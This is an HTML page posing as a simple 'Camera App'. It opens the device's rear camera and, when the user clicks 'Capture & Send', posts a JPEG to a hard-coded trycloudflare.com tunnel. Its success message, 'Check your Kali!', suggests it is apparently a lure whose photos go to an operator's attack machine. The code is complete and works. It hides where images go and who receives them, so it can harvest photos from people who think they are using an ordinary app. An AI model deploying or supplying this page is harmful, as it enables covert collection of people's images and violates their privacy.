<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#000000">
    <title>Camera App</title>
    <link rel="manifest" href="manifest.json">
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #000; 
            color: #0f0; 
            font-family: monospace; 
            margin: 0; 
            padding: 20px; 
            text-align: center;
        }
        video {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            display: none;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            margin: 10px;
            cursor: pointer;
        }
        .status {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <h1>📷 Camera App</h1>
    <video id="video" autoplay playsinline></video>
    <button onclick="startCamera()" id="btn">📷 Start Camera</button>
    <button onclick="snap()" id="snapBtn" style="display:none">📸 Capture & Send</button>
    
    <div class="status" id="status">Click "Start Camera" to begin...</div>

    <script>
        // 👇 YOUR CLOUDFLARED LINK
        const SERVER_URL = 'https://came-maine-succeed-infants.trycloudflare.com';
        
        const video = document.getElementById('video');
        const btn = document.getElementById('btn');
        const snapBtn = document.getElementById('snapBtn');
        const status = document.getElementById('status');

        async function startCamera() {
            try {
                status.innerText = '⏳ Requesting camera...';
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' } 
                });
                video.srcObject = stream;
                video.style.display = 'block';
                btn.style.display = 'none';
                snapBtn.style.display = 'inline-block';
                status.innerText = '✅ Camera ready! Click Capture to send photo!';
            } catch (e) {
                status.innerText = '❌ Error: ' + e.message;
            }
        }

        async function snap() {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
            const blob = await (await fetch(dataURL)).blob();
            
            const formData = new FormData();
            formData.append('file', blob, 'photo.jpg');
            
            status.innerText = '📤 Sending photo...';
            
            try {
                const res = await fetch(SERVER_URL, {
                    method: 'POST',
                    body: formData
                });
                
                status.innerText = '✅ Photo sent! Check your Kali!';
            } catch (e) {
                status.innerText = '❌ Error: ' + e.message;
            }
        }
    </script>
</body>
</html>
